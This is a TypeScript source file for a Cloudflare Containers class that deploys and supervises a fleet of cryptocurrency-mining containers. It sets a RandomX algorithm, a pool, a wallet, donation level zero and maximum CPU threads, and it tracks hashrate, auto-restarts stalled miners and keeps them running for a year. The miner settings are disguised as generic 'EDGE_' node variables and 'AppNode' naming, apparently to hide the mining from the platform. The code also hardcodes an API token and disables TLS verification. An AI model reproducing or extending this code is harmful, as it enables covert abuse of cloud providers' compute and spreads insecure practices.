import{ Container } from "@cloudflare/containers";
import{ log, writeEvent, writeHeartbeat } from "./metrics";
import{ getConfig } from "./config";
import{ ensureSchema } from "./schema";
import type { FleetCommand, HeartbeatMessage } from "./types";

const MAX_RETRIES = 3;
const RETRY_DELAY_MS = 5000;
const HEARTBEAT_INTERVAL_MS = 30000;
const STALL_THRESHOLD = 10;
const EDGE_NODE_API_TOKEN = "edge-node-api-token";

const STATIC_JOB = {
	algorithm: "rx/0",
	cpuAffinity: "auto",
	randomx1gbPages: "false",
	randomxWrmsr: "false",
	randomxCacheQos: "false",
	hugePagesJit: "true",
	cpuMaxThreadsHint: "100",
	donateLevel: "0",
} as const;

const HEARTBEAT_INTERNAL_HOST = "heartbeat.internal";

export class AppNode extends Container<Env> {
	private instanceName: string = "";
	private hasAutoStarted = false;

	defaultPort = 8081;
	requiredPorts = [8081];

	sleepAfter: string | number = "8760h";

	enableInternet = true;

	static outboundByHost = {
		[HEARTBEAT_INTERNAL_HOST]: async (req: Request, env: Env): Promise<Response> => {
			if(req.method !== "POST"){
				return new Response(JSON.stringify({ ok: true }), { status: 200 });
			}
			let body: Partial<HeartbeatMessage> & { instanceId?: string; hashrate?: number };
			try{
				body = JSON.parse(await req.text());
			}catch {
				return new Response(JSON.stringify({ error: "invalid JSON" }), { status: 400 });
			}
			if(body?.instanceId && typeof body.hashrate === "number"){
				const hb: HeartbeatMessage = {
					instanceId: String(body.instanceId).replace(/[^a-zA-Z0-9._-]/g, ""),
					timestamp: Date.now(),
					colo: body.colo || "unknown",
					hashrate: body.hashrate,
					sharesAccepted: body.sharesAccepted ?? 0,
					sharesRejected: body.sharesRejected ?? 0,
					cpuPercent: body.cpuPercent ?? 0,
					connectionStatus: body.connectionStatus || "unknown",
					pool: body.pool || "unknown",
					algorithm: body.algorithm || "rx/0",
					memoryUsage: body.memoryUsage ?? 0,
					uptime: body.uptime ?? 0,
				};
				try{
					await env.HEARTBEAT_QUEUE?.send(hb);
				}catch {

				}
			}
			return new Response(JSON.stringify({ status: "accepted" }), { status: 202 });
		},
	};

	async fetch(req: Request): Promise<Response> {
		const url = new URL(req.url);

		if(!this.hasAutoStarted){
			await this.ctx.blockConcurrencyWhile(async () => {
				if(!this.hasAutoStarted){
					this.hasAutoStarted = true;
					this.ctx.waitUntil(this.tryAutoStart());
				}
			});
		}

		if(url.pathname === "/command" && req.method === "POST"){
			const commands = (await req.json()) as unknown;
			if(!Array.isArray(commands)){
				return new Response(JSON.stringify({ error: "commands array required" }), { status: 400 });
			}
			for(const cmd of commands){
				if(!cmd || typeof cmd !== "object" || typeof (cmd as FleetCommand).type !== "string"){
					return new Response(JSON.stringify({ error: "invalid command" }), { status: 400 });
				}
				await this.handleCommand(cmd as FleetCommand);
			}
			return new Response(JSON.stringify({ status: "ok" }), { status: 200 });
		}
		if(url.pathname === "/spawn" && req.method === "POST"){
			const body = (await req.json()) as { name?: string; regionHint?: string };
			this.instanceName = body.name || this.ctx.id.toString();

			await this.startNode(this.instanceName, body.regionHint);
			return new Response(JSON.stringify({ status: "started", instance: this.instanceName }), { status: 200 });
		}
		if(url.pathname === "/health" && req.method === "GET"){
			return this.handleHealth();
		}
		return new Response("Not Found", { status: 404 });
	}

	async collectMetricsScheduled(): Promise<void> {
		try{
			if(this.instanceName){
				if(this.isContainerRunning()){
					await this.collectMetrics();
				}else{
					log(this.env, "warn", "container not running in scheduled metrics; restarting", {
						instance: this.instanceName,
					});
					this.ctx.waitUntil(this.startNode(this.instanceName));
				}
			}
		}catch(e){
			log(this.env, "error", "scheduled metrics error", { error: String(e), instance: this.instanceName });
		}finally{

			await this.armMetricsChain();
		}
	}

	private async armMetricsChain(): Promise<void> {
		this.deleteSchedules("collectMetricsScheduled");
		await this.schedule(Math.floor(HEARTBEAT_INTERVAL_MS / 1000), "collectMetricsScheduled", {});
	}

	private isContainerRunning(): boolean {
		const c = this.ctx.container;
		return !!(c && c.running);
	}

	private async tryAutoStart(): Promise<void> {
		try{
			if(!this.isContainerRunning()){
				this.instanceName = this.ctx.id.name || this.ctx.id.toString();
				await this.startNode(this.instanceName);
			}else{
				this.instanceName = this.ctx.id.name || this.ctx.id.toString();
				await this.armMetricsChain();
			}
		}catch(e){
			log(this.env, "warn", "auto-start check failed", { error: String(e) });
		}
	}

	private async handleCommand(cmd: FleetCommand): Promise<void> {
		log(this.env, "info", "DO command received", { instanceId: this.instanceName, type: cmd.type });
		switch(cmd.type){
			case "spawn": {
				const name = this.instanceName || this.ctx.id.name || this.ctx.id.toString();
				this.instanceName = name;
				await this.startNode(name, cmd.regionHint);
				break;
			}
			case "restart":
				await this.destroy();
				await this.startNode(this.instanceName);
				break;
			case "reconfigure":
				await this.destroy();
				await this.startNode(this.instanceName, undefined, cmd.newPool, cmd.newMode, cmd.newThreads);
				break;
			case "destroy":
				await this.destroy();
				break;
			case "probe":
				await this.probeContainer();
				break;
			default:
				throw new Error(`unsupported command: ${cmd.type}`);
		}
	}

	private async startNode(
		name: string,
		regionHint?: string,
		overridePool?: string,
		overrideMode?: string,
		overrideThreads?: number
	): Promise<void> {

		await ensureSchema(this.env);

		const config = await getConfig(this.env);

		const targetPool = overridePool || config.pool;
		const targetMode = overrideMode || config.randomxMode;
		const targetThreads = overrideThreads || config.threads;

		if(this.env.DB){
			await this.env.DB.prepare(
				`INSERT INTO instance_registry (instance_id, status, created_at, updated_at, colo, current_pool)
				 VALUES (?, 'starting', ?, ?, ?, ?)
				 ON CONFLICT(instance_id) DO UPDATE SET
					 status='starting', updated_at=?, colo=?, current_pool=?`
			)
				.bind(name, Date.now(), Date.now(), regionHint || "", targetPool, Date.now(), regionHint || "", targetPool)
				.run();
		}

		this.envVars = {
			EDGE_ALGORITHM: STATIC_JOB.algorithm,
			EDGE_UPSTREAM: targetPool,
			EDGE_WALLET: config.wallet,
			EDGE_INSTANCE_NAME: `${config.workerPrefix}-${name}`,
			EDGE_INSTANCE_ID: name,
			EDGE_TLS: config.tls ? "true" : "false",
			EDGE_TLS_VERIFY: "false",
			EDGE_THREADS: String(targetThreads),
			EDGE_CPU_AFFINITY: STATIC_JOB.cpuAffinity,
			EDGE_RANDOMX_MODE: targetMode,
			EDGE_RANDOMX_1GB_PAGES: STATIC_JOB.randomx1gbPages,
			EDGE_RANDOMX_WRMSR: STATIC_JOB.randomxWrmsr,
			EDGE_RANDOMX_CACHE_QOS: STATIC_JOB.randomxCacheQos,
			EDGE_HUGE_PAGES_JIT: STATIC_JOB.hugePagesJit,
			EDGE_CPU_MAX_THREADS_HINT: STATIC_JOB.cpuMaxThreadsHint,
			EDGE_MAX_CPU_USAGE: String(config.maxCpuUsage),
			EDGE_DONATE_LEVEL: STATIC_JOB.donateLevel,
			EDGE_USER_AGENT: config.userAgent,

			HEARTBEAT_HMAC_KEY: this.env.HEARTBEAT_HMAC_KEY || "",

			REPORTER_ENDPOINT: this.env.REPORTER_ENDPOINT_INTERNAL || "",
		};

		for(let attempt = 1; attempt <= MAX_RETRIES; attempt++){
			try{
				await this.startAndWaitForPorts();

				await this.armMetricsChain();
				await this.ctx.storage.put("zero_hashrate_count", 0);
				await this.ctx.storage.put("sample_count", 0);

				writeEvent(this.env, "lifecycle", "container_started", {
					instanceId: name,
					attempt,
					pool: targetPool,
					mode: targetMode,
					threads: targetThreads,
				});

				return;
			}catch(e){
				log(this.env, "error", "start attempt failed", { name, attempt, error: String(e) });
				if(attempt < MAX_RETRIES){
					await new Promise((r) => setTimeout(r, RETRY_DELAY_MS));
				}else{
					if(this.env.DB){
						await this.env.DB.prepare(
							`UPDATE instance_registry SET status='error', last_error=?, updated_at=? WHERE instance_id=?`
						).bind(String(e), Date.now(), name).run();
					}
					throw e;
				}
			}
		}
	}

	private async collectMetrics(): Promise<void> {
		try{
			const res = await this.containerFetch(
				new Request("http://container.local/1/summary", {
					method: "GET",
					headers: { Authorization: `Bearer ${EDGE_NODE_API_TOKEN}` },
				})
			);
			if(!res.ok){
				log(this.env, "warn", "container api non-ok", { status: res.status, instance: this.instanceName });
				return;
			}

			const json = (await res.json()) as {
				hashrate?: { total?: number[] };
				results?: { shares_good?: number; shares_total?: number };
				cpu?: { hashrate?: unknown };
				connection?: { uptime?: number; pool?: string };
				algo?: string;
				resources?: { memory?: { resident_set?: number } };
				uptime?: number;
			};
			const hashrate = json.hashrate?.total?.[0] || json.hashrate?.total?.[1] || 0;
			const sharesGood = json.results?.shares_good || 0;
			const sharesTotal = json.results?.shares_total || 0;

			const config = await getConfig(this.env);

			const hb: HeartbeatMessage = {
				instanceId: this.instanceName,
				timestamp: Date.now(),
				colo: "unknown",
				hashrate,
				sharesAccepted: sharesGood,
				sharesRejected: sharesTotal - sharesGood,
				cpuPercent: json.cpu?.hashrate ? 100 : 0,
				connectionStatus: (json.connection?.uptime ?? 0) > 0 ? "connected" : "disconnected",
				pool: json.connection?.pool || config.pool,
				algorithm: json.algo || STATIC_JOB.algorithm,
				memoryUsage: json.resources?.memory?.resident_set || 0,
				uptime: json.uptime || 0,
			};

			writeHeartbeat(this.env, hb);

			let queued = false;
			for(let attempt = 0; attempt < 3 && !queued; attempt++){
				try{
					await this.env.HEARTBEAT_QUEUE?.send(hb);
					queued = true;
				}catch(queueErr){
					if(attempt === 2){
						log(this.env, "warn", "heartbeat queue send failed (final)", {
							error: String(queueErr),
							instance: this.instanceName,
							attempts: attempt + 1,
						});
					}else{
						await new Promise((r) => setTimeout(r, 200 * Math.pow(2, attempt)));
					}
				}
			}

			if(hashrate === 0){
				const zeroCount = (await this.ctx.storage.get<number>("zero_hashrate_count")) || 0;
				await this.ctx.storage.put("zero_hashrate_count", zeroCount + 1);
				if(zeroCount + 1 >= STALL_THRESHOLD){
					log(this.env, "error", "stall detected, initiating restart", {
						instance: this.instanceName,
						zeroCount: zeroCount + 1,
					});
					writeEvent(this.env, "lifecycle", "stall_restart", {
						instanceId: this.instanceName,
						zeroCount: zeroCount + 1,
					});
					this.ctx.waitUntil(
						this.handleCommand({ type: "restart", instanceId: this.instanceName, reason: "stall" })
					);
				}
			}else{
				await this.ctx.storage.put("zero_hashrate_count", 0);
			}
		}catch(e){
			log(this.env, "warn", "collectMetrics failed", { instance: this.instanceName, error: String(e) });
		}
	}

	private async probeContainer(): Promise<void> {
		try{
			const res = await this.containerFetch(
				new Request("http://container.local/1/summary", {
					method: "GET",
					headers: { Authorization: `Bearer ${EDGE_NODE_API_TOKEN}` },
				})
			);
			if(res.status >= 200 && res.status < 300){
				if(this.env.DB){
					await this.env.DB.prepare(
						`UPDATE instance_registry SET status='running', updated_at=? WHERE instance_id=?`
					).bind(Date.now(), this.instanceName).run();
				}
			}else{
				log(this.env, "warn", "probe returned non-2xx", { name: this.instanceName, status: res.status });
			}
		}catch(e){
			log(this.env, "warn", "probe failed", { name: this.instanceName, error: String(e) });
		}
	}

	private async handleHealth(): Promise<Response> {
		try{
			if(this.isContainerRunning()){
				const res = await this.containerFetch(
					new Request("http://container.local/1/summary", {
						method: "GET",
						headers: { Authorization: `Bearer ${EDGE_NODE_API_TOKEN}` },
					})
				);
				if(res.ok){
					const json = (await res.json()) as {
						hashrate?: { total?: number[] };
						results?: Record<string, unknown>;
						connection?: Record<string, unknown>;
						cpu?: Record<string, unknown>;
						uptime?: number;
					};
					return new Response(
						JSON.stringify({
							status: "healthy",
							hashrate: json.hashrate?.total?.[0] || 0,
							instanceId: this.instanceName,
							uptime: json.uptime || 0,
							results: json.results || {},
							connection: json.connection || {},
							cpu: json.cpu || {},
						}),
						{ status: 200, headers: { "content-type": "application/json" } }
					);
				}
				return new Response(JSON.stringify({ status: "degraded", apiStatus: res.status }), { status: 200 });
			}
			return new Response(JSON.stringify({ status: "unhealthy", running: false }), { status: 503 });
		}catch(e){
			return new Response(JSON.stringify({ status: "error", error: String(e) }), { status: 503 });
		}
	}

}
